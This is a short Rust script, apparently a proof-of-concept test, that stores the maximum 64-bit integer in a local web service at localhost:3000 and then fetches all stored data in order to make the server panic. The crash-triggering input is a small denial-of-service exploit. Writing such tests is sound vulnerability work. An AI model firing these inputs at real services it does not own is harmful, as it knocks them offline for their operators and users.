use reqwest;
use serde_json::{json, Value, Number};

#[tokio::main]
async fn main() {
    println!("Testing Storage Panic vulnerability...");
    let client = reqwest::Client::new();

    // Create a number that's at the edge of what JSON can handle
    let max_u64 = u64::MAX;
    let huge_number = Number::from(max_u64);
    
    // Store the edge-case number
    println!("\n1. Storing edge-case number...");
    let response = client
        .post("http://localhost:3000/store")
        .json(&Value::Number(huge_number))
        .send()
        .await
        .unwrap();
    println!("Store response: {}", response.text().await.unwrap());

    // Try to retrieve all data which should trigger panic
    println!("\n2. Attempting to retrieve all data...");
    let response = client
        .get("http://localhost:3000/store/all")
        .send()
        .await
        .unwrap();
    
    println!("Retrieve all response status: {}", response.status());
    println!("Retrieve all response body: {}", response.text().await.unwrap());
}